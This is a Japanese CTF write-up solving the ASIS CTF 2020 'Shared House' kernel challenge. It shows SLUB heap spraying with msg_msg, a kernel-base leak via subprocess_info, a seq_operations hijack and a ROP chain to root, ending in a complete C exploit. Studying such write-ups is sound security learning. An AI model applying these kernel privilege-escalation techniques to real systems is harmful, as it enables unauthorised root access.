keyowrds
kernel exploit, heap spray, kernel ROP, slub, subprocess_info, seq_operations, msgmsg

# イントロ
いつぞや開催された**ASIS CTF 2020 Quals**。その*kernel exploit*問題である**Shared House**を解いていく。割とベーシックな問題。

本exploitは**CVE-2016-6187**(off-by-one NULL-byte overflow)のexploitを主に参考にしている。この脆弱性は本問題と割と似ている。[このCVEのexploit](https://duasynt.com/blog/cve-2016-6187-heap-off-by-one-exploit)は非常に丁寧でわかりやすいため一読の価値あり(5年前のだけどそんなにふるさは感じない)。

# static analysis
```
/ $ cat /proc/version
Linux version 4.19.98 (ptr@medium-pwn) (gcc version 8.3.0 (Buildroot 2019.11-git-00204-gc2417843c8)) #14 SMP Fri Jun 12 15:19:48 JST 2020

qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio \
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr pti=off quiet" \
    -cpu qemu64,+smep \
    -monitor /dev/null \
    -nographic

$ modinfo ./note.ko
filename:       /home/wataru/Documents/ctf/asis2020quals/shared_house/work/./note.ko
description:    ASIS CTF Quals 2020
author:         ptr-yudai
license:        GPL
depends:
retpoline:      Y
name:           note
vermagic:       4.19.98 SMP mod_unload

```
SMEP有効・SMAP無効・KPTI無効・oops->panic・シングルコア
(これ`vermagic`に`SMP`って書いてあるけど、ほんとにSMP有効なんかな。`__per_cpu_offset`無かったけど)


## commands
```commands.c
0xC12ED002: SH_FREE
    if note is not NULL then
        kfree(note);
        note = NULL;
0xC12ED001: SH_ALLOC
    if query.size <= 0x80 then
        size = query.size;
        note = kmalloc(size, GPF_KERNEL);
0xC12ED003: SH_WRITE
    if query.size <= size then
        _copy_from_user(note, query.size);
        note[buf.size] = '\0';
0xC12ED004: SH_READ
    if note is not NULL and query.size <= size then
        _copy_to_user(query.buf);
```

## globals
```globals.sh
char *note;    // user指定のsizeだけの容量
int size;      // user指定のsize
```

## structures
```structures.c
struct query{
    int size;
    int NOUSE; // ulong sizeでいいわ
    char *buf;
}
```

# vuln
NULL byte overflow in kmalloc-8 ~ kmalloc-128
```vuln.c
          if (command == 0xc12ed003) {
            if (note != (char *)0x0) {
              if (buf.size <= size) {
                lVar1 = _copy_from_user(note,buf.buf);
                if (lVar1 == 0) {
                  note[buf.size] = '\0';
                  goto LAB_00100107;
                }
              }
            }
```

# まず確認
NULL-byte overflowがあるからobjectのnextポインタを書き換えるんだろうが、`CONFIG_SLAB_FREELIST_HARDENED`/`CONFIG_SLAB_FREELIST_RANDOM`があるとhogeだし、そもそもに`kmem_cache.offset`がノンゼロだと書き換えることすらできないからcheck it out.
```check-slab.sh
Breakpoint 1, 0xffffffffc0000000 in ?? () # ioctl()
(gdb) hb *0xffffffff810eda10 # kmalloc_slab
Hardware assisted breakpoint 2 at 0xffffffff810eda10
(gdb) c
Continuing.
Breakpoint 2, 0xffffffff810eda10 in ?? () # kmalloc_slab()
(gdb) p/x $rdi # 0x30サイズで呼び出したからこれが目的
$1 = 0x30
(gdb) fin
Run till exit from #0  0xffffffff810eda10 in ?? ()
0xffffffff81111520 in ?? ()
(gdb) p/x $rax
$2 = 0xffff88800f001b00 # kmalloc-64
(gdb) symbol-file ./vmlinux # 型情報だけ欲しいから自前vmlinux読む
Reading symbols from ./vmlinux...
(gdb) lx-symbols
loading vmlinux
(gdb) p *(struct kmem_cache*)$rax
$3 = {cpu_slab = 0x20200 <ftrace_stacks+6816>, flags = 1073741824, min_partial = 5, size = 64, object_size = 64, reciprocal_size = {m = 0, sh1 = 30 '\036', sh2 = 0 '\000'}, offset = 64, oo = {x = 64}, max = {
    x = 64}, min = {x = 0}, allocflags = 1, refcount = 0, ctor = 0x0 <fixed_percpu_data>, inuse = 64, align = 8, red_left_pad = 0,
  name = 0xffffffff81b01e2e <ieee80211_tdls_build_mgmt_packet_data+318> "kmalloc-64", list = {next = 0xffff88800f001c60, prev = 0xffff88800f001a60}, kobj = {
    name = 0xffffffff81b01e2e <ieee80211_tdls_build_mgmt_packet_data+318> "kmalloc-64", entry = {next = 0xffff88800f001c78, prev = 0xffff88800f001a78}, parent = 0xffff88800f1d8378, kset = 0xffff88800f1d8360,
    ktype = 0xffffffff81c35ac0 <__entry_text_end+214374>, sd = 0xffff88800eb62a18, kref = {refcount = {refs = {counter = 1}}}, state_initialized = 1, state_in_sysfs = 1, state_add_uevent_sent = 1,
    state_remove_uevent_sent = 0, uevent_suppress = 0}, remote_node_defrag_ratio = 4294967264, useroffset = 15, usersize = 251665336, node = {0xffff88800f001bb8, 0xffffffff8110f830 <audit_add_watch+320>,
    0x4000000000, 0xffff88800f000f00, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x201e0 <ftrace_stacks+6784>, 0x40000000, 0x5 <fixed_percpu_data+5>,
    0x2000000020, 0x1e00000000, 0x8000000080, 0x80, 0x1 <fixed_percpu_data+1>, 0x0 <fixed_percpu_data>, 0x800000020, 0x0 <fixed_percpu_data>, 0xffffffff81b01e23 <ieee80211_tdls_build_mgmt_packet_data+307>,
    0xffff88800f001d60, 0xffff88800f001b60, 0xffffffff81b01e23 <ieee80211_tdls_build_mgmt_packet_data+307>, 0xffff88800f001d78, 0xffff88800f001b78, 0xffff88800f1d8378, 0xffff88800f1d8360,
    0xffffffff81c35ac0 <__entry_text_end+214374>, 0xffff88800eb63aa0, 0x700000001, 0xfffffffe0, 0xffff88800f001cb8, 0xffff88800f001cb8, 0xffffffff8110f830 <audit_add_watch+320>, 0x2000000000,
    0xffff88800f000f40, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x201c0 <ftrace_stacks+6752>, 0x40000000, 0x5 <fixed_percpu_data+5>, 0x1000000010,
    0x1e00000000, 0x10000000100, 0x100, 0x1 <fixed_percpu_data+1>, 0x0 <fixed_percpu_data>, 0x800000010, 0x0 <fixed_percpu_data>, 0xffffffff81b01e18 <ieee80211_tdls_build_mgmt_packet_data+296>,
    0xffff88800f001e60, 0xffff88800f001c60, 0xffffffff81b01e18 <ieee80211_tdls_build_mgmt_packet_data+296>, 0xffff88800f001e78, 0xffff88800f001c78, 0xffff88800f1d8378, 0xffff88800f1d8360,
    0xffffffff81c35ac0 <__entry_text_end+214374>, 0xffff88800eb64b28, 0x700000001, 0xfffffffe0, 0xffff88800f001db8}}
```
`offset`が64になっているため各objectの0byte目にnextのpointerが入ることが分かる。実際に見てみると以下のとおり。
```freelist.sh
(gdb) p/x *(struct kmem_cache_cpu*)(0x20200 + $gs_base)
$3 = {
  freelist = 0xffff88800e666100,
  tid = 0x108b,
  page = 0xffffea0000399980
}
(gdb) x/50gx 0xffff88800e666100
0xffff88800e666100:     0xffff88800e666140      0x00000021646c726f
0xffff88800e666110:     0x0000000000000000      0x0000000000000000
0xffff88800e666120:     0x0000000000000000      0x0000000000000000
0xffff88800e666130:     0x0000000000000000      0x0000000000000000
0xffff88800e666140:     0xffff88800e666180      0x00e800000000c7c7
0xffff88800e666150:     0x3110c48348000000      0x003d8b48c35d5bc0
0xffff88800e666160:     0x8d74ff8548000000      0x000000153be8558b
0xffff88800e666170:     0xe8f0758b48827700      0x0fc0854800000000
0xffff88800e666180:     0xffff88800e6661c0      0xc600000000158b48
0xffff88800e666190:     0x3d8b48b2eb000204      0x0fff854800000000
0xffff88800e6661a0:     0x0000e8ffffff5084      0x00000005c7480000
0xffff88800e6661b0:     0x4890eb0000000000      0x45e9ffffffeac0c7
0xffff88800e6661c0:     0xffff88800e666200      0x55ffffff39e9ffff
0xffff88800e6661d0:     0x000000c1c748f631      0xc74800000001ba00
0xffff88800e6661e0:     0xe5894800000000c7      0xc08500000000e853
0xffff88800e6661f0:     0x000000c7c7481374      0x00e8fffffff0bb00
0xffff88800e666200:     0xffff88800e666240      0x00c7c74800000000
0xffff88800e666210:     0x00000000e8000000      0x01ba00000000358b
0xffff88800e666220:     0x0000c7c748000000      0x00000005c7480000
0xffff88800e666230:     0x0000e80000000000      0x2374c389c0850000
0xffff88800e666240:     0xffff88800e666280      0x000000e8fffffff0
0xffff88800e666250:     0xbe000000003d8b00      0x000000e800000001
0xffff88800e666260:     0x0000c2c7481aeb00      0x000000c6c7480000
0xffff88800e666270:     0x00000000c7c74800      0x5bd88900000000e8
0xffff88800e666280:     0xffff88800e6662c0      0x0000e8e589480000
```
`freelist`のランダマイズもされていないし、ポインタの難読化もされていない。良さそう。

# kernbase leak
## subprocess_info
参考.3のkernel構造体集を参照して、*kmalloc-128*以下でkernbaseがleakできるものを探す。但し、その構造体を利用する際に本モジュールのobjectとvictim objectが隣接するように新規ページ(スラブ)を利用するように調節(**heap spray**)する必要があり、leakに使う構造体と同一サイズのスラブを利用して任意の回数allocできる構造体も存在していなければならない(しかも、それは`setxattr`のように確保と同一パスで解放されてはならない)。
この条件のもとで、sprayには`struct msg_msg`(*kmalloc-64*~)を、kernbase leakには`struct subprocess_info`(*kmalloc-128*)を利用できる。

こいつは、参考.1の通り`socket(22,AF_INET,0)`のように呼んだ時に`__sock_create()`から呼ばれる`request_module()`(実体は`call_modprobe()`またはその内側で呼ばれる`call_usermodehelper_setup()`)において確保される。この際に、`work.func`に`call_usermodehelper_exec_work()`が入るためこれがleak可能となる。
```ernel/umh.c
	struct subprocess_info *sub_info;
	sub_info = kzalloc(sizeof(struct subprocess_info), gfp_mask);
	if (!sub_info)
		goto out;

	INIT_WORK(&sub_info->work, call_usermodehelper_exec_work);
```
また、同一パスで`call_usermodehelper_exec()`において最終的に`call_usemodehelper_freeinfo()`が呼ばれ、`info->cleanup(info)`を呼んだ後に解放される。
```kernel/umh.c
static void call_usermodehelper_freeinfo(struct subprocess_info *info)
{
	if (info->cleanup)
		(*info->cleanup)(info);
	kfree(info);
}
```

まずはこの構造体を使ってleakを行う。具体的には`subprocess_info`の先頭から*0x18*byte目に先程の関数ポインタが入っているから、これをleakする。*total size*は*0x60(<0x80)*ゆえ、*kmalloc-128*に入る。
![](https://i.imgur.com/rpfd0xU.png)


## heap spray
NULL-byte overflowして書き換えるvictimが隣接したobjectになるように、新しいスラブ(ページ)を使いたい。まずは*root*で該当スラブの初期状態を確認。
```slab-info.sh
/ # cat /proc/slabinfo | grep ^kmalloc-128
kmalloc-128          256    256    128   32    1 : tunables    0    0    0 : slabdata      8      8      0
```
あれ、この段階ですでにスラブは満杯になってるんかな。と思ったけど、実際にデバッグしてみると0x5回allocした時に新たにスラブが作られた。まあ正直完全に新品である必要はないから、1スラブあたりの最大オブジェクト数である0x20回+αくらいallocしておいたら良いと思う。まあ今回は0x5回+αの0xF回allocしたところいい感じになった。
![](https://i.imgur.com/ci1zmZt.png)

これで、object丁度のサイズを`_write()`すればNULL-byte overflowが起こり`freelist`は以下のようになる。
![](https://i.imgur.com/MGAJqy1.png)


`freelist`のnext(*0xFFFF80800E69B100*)が自分自身を指していることが分かる。ここですぐに`subprocess_info`を割り当ててしまうと、`subprocess_info`の先頭ワードがnextとなり、ヒープが崩壊してしまう。よって、一度`note`を解放して`msgsnd()`でobject1つ分をパディングした後、循環するobject(*0xFFFF80800E69B100*)に`note`を書く。その際に先頭1wordをNULLにしておくことで、`freelist`はNULLになり、次の`kmem_cache_alloc()`時(`freelist`には`note`をallocした時点で`note`のアドレスが書き込まれているため、厳密には次の次)には**正常に新しいスラブを確保してくれる**ことになる。
`socket()`を呼び出す直前のスラブの状態は以下のとおりである。*0x58*が入っているのは`note`である。`freelist`には`note`のアドレスが入っているものの、`note`の先頭が0であるから、次の`socket`呼び出し時に`subprocess_info`をallocする同時に新しいスラブが割り当てられる。実際、以下のようになって、新しいスラブになっていることが分かる(下3nibbleが000)。
![](https://i.imgur.com/iDJcfqO.png)

あとは`note`とオーバーラップした`subprocess_info`を読めばkernbaseのleak完了。

# RIPを取る
## cleanup + usefaultfd (FAIL)
前述したように、`subprocess_info`は解放時に`subprocess_info.cleanup()`をするため、これを上書きすることができればRIPが取れる。方法として[参考.1](https://duasynt.com/blog/cve-2016-6187-heap-off-by-one-exploit)では`subprocess_info`がページをまたがって確保されるようにし、前者と後者それぞれに`userfaultfd`を設定することで上手く`cleanup`が任意の値に操作できるようにしている。但し、*kmalloc-128*を利用する以上はオブジェクトはページをまたがって確保されることはない。
よって、先程`freelist`がNULLになるように調整したが、これをuserlandのmmapしたアドレスを指すようにしたら`freelist`がユーザ領域を指すようになって自由にわいわいできるんじゃないかと考えた。けど、フォルトで死んだ。SMAP無効でKPTI無効(SMEPのみ有効)な場合も、こういうのってダメなんだっけ？？？？？
![](https://i.imgur.com/p7kAJ2t.png)


## 諦めて素直にseq_operations
素直に生きましょう。
`seq_operations`は*kmalloc-32*に入る。
```kmalloc-32.sh
/ # cat /proc/slabinfo | grep ^kmalloc-32
kmalloc-32           512    512     32  128    1 : tunables    0    0    0 : slabdata      4      4      0
```
1スラブあたり0x80オブジェクトだから、まぁこれ+αくらいallocしておけば大丈夫そう。以下が0x80回allocした後の図。
![](https://i.imgur.com/EojnXUd.png)

NULL-byte overflowでnextを書き換えることを考えると、*0xffff88800e6a1420*となっているところを書き換えたい。というわけで、allocする回数を微調整しつつ、victimとなる`seq_operations`をallocする直前の状態が以下のとおり。
![](https://i.imgur.com/paMYe2p.png)


*0xffff88800e692410*は`note`が割り当てられているが、`freelist`からも指されていることが分かる。この際、**noteの中身をNULLにしておかないと、それがfreelistの次のobjectだと認識されてヒープが壊れる**ので、NULLにしておく。
(author's writeupではkernel heapをleakしていたが、この方法でやれば**heapのleakは必要ない**)

これで、`read()`をすればRIPが取れる。


# ROP chain
あとは、ROPで終わり。ROPをするためにはRSPを制御できる必要がある。SPを制御できるガジェットは以下の通りで、この中から下1nibbleが8-alignされている適当なものを選ぶ。(適当と言っても、この内9割くらいは実際に見てみると*0xcc*命令に置き換わっている、なんで)
```sp_gad.sh
$ rp++ -f ./vmlinux --unique -r1 | grep "mov esp"
0xffffffff81cb0980: mov esp, 0x0000002C ; call rax ;  (1 found)
0xffffffff81e312bb: mov esp, 0x00F461F3 ; retn 0x901F ;  (1 found)
0xffffffff814cd63b: mov esp, 0x01000005 ; ret  ;  (1 found)
0xffffffff810589b3: mov esp, 0x01428DD2 ; ret  ;  (1 found)
0xffffffff812326ba: mov esp, 0x09B8550B ; retn 0x850F ;  (1 found)
0xffffffff8104a73a: mov esp, 0x09E0D3C9 ; retn 0x8966 ;  (1 found)
0xffffffff81e5a1ed: mov esp, 0x0A6805DD ; ret  ;  (1 found)
0xffffffff81d95b1e: mov esp, 0x0B0AAD86 ; retn 0x962F ;  (1 found)
0xffffffff81dbc583: mov esp, 0x0F0B0C00 ; retn 0xC095 ;  (1 found)
0xffffffff8148dc49: mov esp, 0x0F4881A6 ; retn 0x66C3 ;  (1 found)
0xffffffff81dec325: mov esp, 0x131D832C ; ret  ;  (1 found)
0xffffffff81e3d509: mov esp, 0x144714DE ; ret  ;  (1 found)
0xffffffff81e55754: mov esp, 0x15CE2A03 ; ret  ;  (1 found)
0xffffffff81dff9cc: mov esp, 0x15FF851B ; retn 0x7EB1 ;  (1 found)
0xffffffff81dd79b7: mov esp, 0x167C22B7 ; retn 0x9847 ;  (2 found)
0xffffffff81dc56bb: mov esp, 0x1BD15533 ; call rcx ;  (1 found)
(snipped...)
```


あとはいい感じにchainを組む。今回はno-KPTI。*iretq*は[以下の通り](https://www.felixcloutier.com/x86/iret:iretd)。
```iretq.c
PROTECTED-MODE:
    IF NT = 1
        THEN GOTO TASK-RETURN; (* PE = 1, VM = 0, NT = 1 *)
    FI;
    IF OperandSize = 32
        THEN
                EIP ← Pop();
                CS ← Pop(); (* 32-bit pop, high-order 16 bits discarded *)
                tempEFLAGS ← Pop();
        ELSE (* OperandSize = 16 *)
                EIP ← Pop(); (* 16-bit pop; clear upper bits *)
                CS ← Pop(); (* 16-bit pop *)
                tempEFLAGS ← Pop(); (* 16-bit pop; clear upper bits *)
    FI;
    IF tempEFLAGS(VM) = 1 and CPL = 0
        THEN GOTO RETURN-TO-VIRTUAL-8086-MODE;
        ELSE GOTO PROTECTED-MODE-RETURN;
    FI;
TASK-RETURN: (* PE = 1, VM = 0, NT = 1 *)
    SWITCH-TASKS (without nesting) to TSS specified in link field of current TSS;
    Mark the task just abandoned as NOT BUSY;
    IF EIP is not within CS limit
        THEN #GP(0); FI;
END;
```

# exploit
```exploit.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>


// commands
#define DEV_PATH "/dev/note"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define uint unsigned int
#define scu static const ulong
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) assert(sizeof(msgbuf.mtext) > 0x30); \
                        for(int ix=0; ix!=N; ++ix){\
                          if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should  compile with  -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) :: "memory"
   );
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

// (shared_house)
#define SH_ALLOC  0xC12ED001
#define SH_FREE   0xC12ED002
#define SH_WRITE  0xC12ED003
#define SH_READ   0xC12ED004

#define FAIL1     0xffffffffffffffa
#define FAIL2     0xfffffffffffffff

struct query{
  ulong size;
  char *buf;
};

#define INF 1<<31
int shfd;
int statfd;
uint current_size = INF;


void _alloc(uint size){
  printf("[+] alloc: %x\n", size);
  assert(size <= 0x80);
  struct query q = {
    .size = size
  };
  int tmp = ioctl(shfd, SH_ALLOC, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
  current_size = size;
}

void _free(void){
  printf("[+] free\n");
  assert(current_size != INF);
  struct query q = {
  };
  int tmp = ioctl(shfd, SH_FREE, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
  current_size = INF;
}

void _write(char *buf, uint size){
  printf("[+] write: %p %x\n", buf, size);
  assert(current_size != INF && size <= current_size);
  assert(current_size != -1);
  struct query q = {
    .buf = buf,
    .size = size
  };
  int tmp = ioctl(shfd, SH_WRITE, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
}

void _read(char *buf, uint size){
  printf("[+] read: %p %x\n", buf, size);
  assert(current_size != INF && size <= current_size);
  struct query q = {
    .buf = buf,
    .size = size
  };
  int tmp = ioctl(shfd, SH_READ, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
}
// (END shared_house)

/*********** MAIN *********************************/

struct _msgbuf80{
  long mtype;
  char mtext[0x80];
};

void gen_chain(ulong **a, const ulong kernbase)
{
  scu pop_rdi = 0x11c353;
  scu prepare_kernel_cred = 0x69e00;
  scu rax2rdi_rep_pop_rbp = 0x1877F; // 0xffffffff8101877f: mov rdi, rax ; rep movsq  ; pop rbp ; ret  ;  (1 found)
  scu commit_creds = 0x069c10; // 0xffffffff81069c10
  scu pop_rcx = 0x368fa; // 0xffffffff810368fa: pop rcx ; ret  ;  (53 found)
  scu pop_r11 = 0xe12090; // 0xffffffff81e12090: pop r11 ; ret  ;  (2 found)
  scu swapgs_pop_rbp = 0x03ef24; // 0xffffffff8103ef24:       0f 01 f8     swapgs
  scu iretq_pop_rbp = 0x1d5c6; // 0xffffffff8101d5c6:   48 cf   iretq

  save_state();

  *a++ = pop_rdi + kernbase;
  *a++ = 0;
  *a++ = prepare_kernel_cred + kernbase;
  *a++ = pop_rcx + kernbase;
  *a++ = 0;
  *a++ = rax2rdi_rep_pop_rbp + kernbase;
  *a++ = 0;
  *a++ = commit_creds + kernbase;

  *a++ = swapgs_pop_rbp + kernbase;
  *a++ = 0;
  *a++ = iretq_pop_rbp + kernbase;
  *a++ = &NIRUGIRI;
  *a++ = user_cs;
  *a++ = user_rflags;
  *a++ = user_sp;
  *a++ = user_ss;

  *a++ = 0xdeadbeef; // unreachable
}

int main(int argc, char *argv[]) {
  char buf[0x1000];
  shfd = open(DEV_PATH, O_RDWR);
  assert(shfd >= 0);

  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if(qid == -1) errExit("msgget");
  struct _msgbuf80 msgbuf = { .mtype = 1 };
  KMALLOC(qid, msgbuf, 0xF);

  _alloc(0x80);
  memset(buf, 'X', 0x80);
  _write(buf, 0x80); // vuln

  _free();
  KMALLOC(qid, msgbuf, 0x1);
  memset(buf, 0, 0x8);
  //*((ulong*)buf) = (ulong)maddr;
  _alloc(0x80);
  _write(buf, 0x80);
  assert(socket(22, AF_INET, 0) < 0); // overlap subprocess_info
  _read(buf, 0x80);
  const ulong call_usermodehelper_exec_work = ((ulong*)buf)[0x18/sizeof(ulong)];
  printf("[!] call_usermodehelper_exec_work: 0x%lx\n", call_usermodehelper_exec_work);
  const ulong kernbase = call_usermodehelper_exec_work - (0xffffffff81060160 - 0xffffffff81000000);
  printf("[!] kernbase: 0x%lx\n", kernbase);
  _free();

  for(int ix=0; ix!=0x82; ++ix){
    statfd = open("/proc/self/stat", O_RDONLY);
    assert(statfd > 0);
  }
  _alloc(0x20);
  memset(buf, 'x', 0x20);
  _write(buf, 0x20);  // vuln
  _free();
  statfd = open("/proc/self/stat", O_RDONLY); // dummy
  _alloc(0x20);
  statfd = open("/proc/self/stat", O_RDONLY); // victim

  *((ulong*)buf) = kernbase + 0x05832b;
  _write(buf, 0x20);

  // prepare chain
  const ulong gadstack = 0x83C389C0;
  const char *maddr = mmap((void*)(gadstack & ~0xFFF), 4*PAGE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  printf("[+] mmapped @ %p\n", maddr);
  const char *chain = maddr + (gadstack & 0xFFF);
  gen_chain(chain, kernbase);

  // NIRUGIRI
  read(statfd, buf, 1);

  return 0;
}
```



# アウトロ


もうすぐ春ですね。



# symbols without KASLR
```symbols.txt
ioctl: 0xffffffffc0000000
kmem_cache_alloc: 0xffffffff81111610
__kmalloc: 0xffffffff81111500
kmalloc_slab: 0xffffffff810eda10
kmalloc-128's cpu_slab: 0x20240
kmalloc-32's cpu_slab: 0x201e0
prepare_kernel_cred: 0xffffffff81069e00
commit_creds: 0xffffffff81069c10
```
シンボル`__per_cpu_offset`がなかったからSMPじゃないと思ったけど、モジュール情報ではSMPになってるしどうなんだろうなぁ。(因みに`__per_cpu_offset`が無い時のCPU固有アドレスは、`$gs_base + CPU固有ポインタ`で計算される)


# 参考
CVE-2016-6187のexploit
https://duasynt.com/blog/cve-2016-6187-heap-off-by-one-exploit
author's writeup
https://ptr-yudai.hatenablog.com/entry/2020/07/06/000622#354pts-Shared-House-7-solves
author's portfolio
https://youtu.be/kgeG9kXFb0A
kernelpwnで使える構造体refs
https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628
ニルギリ
https://youtu.be/yvUvamhYPHw
